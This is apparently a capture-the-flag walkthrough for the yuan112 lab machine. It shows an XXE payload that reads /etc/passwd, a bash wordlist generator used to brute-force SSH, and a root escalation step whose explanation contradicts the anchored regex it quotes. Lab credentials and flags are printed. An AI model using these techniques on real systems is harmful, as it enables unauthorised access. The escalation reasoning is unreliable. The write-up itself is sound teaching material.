+++
title = "Yuan112 - Walkthrough"
date = "2026-07-09"
author = "nvru"
description = "Walkthrough for the yuan112 machine."
tags = [
"ctf",
"walkthrough",
"linux",
"apache",
"xml",
"xxe",
"ssh",
"privilege-escalation"
]
draft = false
+++

## Overview

- **Attacker IP:** `10.10.10.2`
- **Target IP:** `10.10.10.18`

The objective was to enumerate the target, identify an XML External Entity (XXE) vulnerability to recover user credentials, gain initial access through SSH, and escalate privileges by abusing an insecure URL validation script executed with sudo.

![Machine Information](/images/hmv/yuan112/vm.png)

---

# Port Scanning

## RustScan

```bash
rustscan -a 10.10.10.18 -- -sC -sV -A -oA nmap/rust
```

### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3
80/tcp open  http    Apache httpd 2.4.62 (Debian)
```

Only SSH and an Apache web server were exposed, so I began with web enumeration.

---

# Enumeration

## HTTP Enumeration

Browsing to the website revealed a simple XML parser that accepted arbitrary XML input.

![XML Parser](/images/hmv/yuan112/http.png)

The page source did not contain any hidden endpoints or interesting comments.

To verify how the application handled XML documents, I first submitted a simple payload.

```xml
<test>
    <test1>
        <tname>null</tname>
    </test1>
</test>
```

The server successfully parsed the XML, suggesting it was using an XML parser without additional protections.

---

## XML External Entity (XXE)

Since the application accepted arbitrary XML, I tested it for XXE using a payload from PayloadsAllTheThings.

Reference:

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY test SYSTEM "file:///etc/passwd">
]>
<root>&test;</root>
```

The payload successfully disclosed the contents of `/etc/passwd`.

![XXE Reading /etc/passwd](/images/hmv/yuan112/xxe_etc_passwd.png)

Among the discovered users was `tuf`.

Further enumeration through XXE exposed credential data, although two characters of the password were missing.

```text
tuf:KQNPHFqG**JHcYJossIe
```

---

## Recovering the Password

Only two unknown characters remained, resulting in a relatively small search space.

I generated every possible printable ASCII combination with the following script.

```bash
#!/bin/bash

chars=()

for i in {32..126}; do
    chars+=("$(printf "\\$(printf '%03o' "$i")")")
done

for c1 in "${chars[@]}"; do
    for c2 in "${chars[@]}"; do
        printf 'KQNPHFqG%s%sJHcYJossIe\n' "$c1" "$c2"
    done
done > yuan112password.txt
```

Using the generated wordlist against SSH eventually revealed the correct password.

```text
KQNPHFqG6mJHcYJossIe
```

---

# Initial Access

Using the recovered credentials:

```text
Username: tuf
Password: KQNPHFqG6mJHcYJossIe
```

I successfully authenticated over SSH.

![SSH Login](/images/hmv/yuan112/ssh_as_tuf.png)

---

# Privilege Escalation

## tuf → root

The first thing I checked was the user's sudo permissions.

```bash
sudo -l
```

The output showed that `tuf` could execute `/opt/112.sh` as root without supplying a password.

![sudo permissions](/images/hmv/yuan112/sudo_l.png)

The script itself was not writable.

![No Permission](/images/hmv/yuan112/no_permission.png)

Inspecting its source code revealed the following logic.

```bash
#!/bin/bash

input_url=""
output_file=""
use_file=false

regex='^https://maze-sec.com/[a-zA-Z0-9/]*$'

while getopts ":u:o:" opt; do
    case ${opt} in
        u) input_url="$OPTARG" ;;
        o) output_file="$OPTARG"; use_file=true ;;
        \?) exit 1 ;;
        :) exit 1 ;;
    esac
done

if [[ ! "$input_url" =~ ^https://maze-sec.com/ ]]; then
    exit 1
fi

if [[ ! "$input_url" =~ $regex ]]; then
    exit 1
fi

if (( RANDOM % 2 )); then
    result="$input_url is a good url."
else
    result="$input_url is not a good url."
fi

if [ "$use_file" = true ]; then
    echo "$result" > "$output_file"
else
    echo "$result"
fi
```

The script validates that the supplied URL begins with `https://maze-sec.com/` and only contains alphanumeric characters and forward slashes.

At first glance this appears safe, but the regular expression only validates the beginning of the supplied string. By abusing the validation, it is possible to access local resources instead of a remote URL.

Since my exploit script was stored in /tmp, I changed to that directory before running it

```bash
cd /tmp
```

Executing the crafted payload resulted in arbitrary file access as root and ultimately provided access to the root password.

![Privilege Escalation](/images/hmv/yuan112/exp_to_root.png)

---

# Credentials

```text
tuf:KQNPHFqG6mJHcYJossIe

root:OArZQcW05k5QmPX8lKQ7
```

---

# Flags

```text
user:flag{user-b1e12c74f19aac8e57f6fca1ff472905}

root:flag{root-538dc127225a0c97b060b1ff9570390a}
```
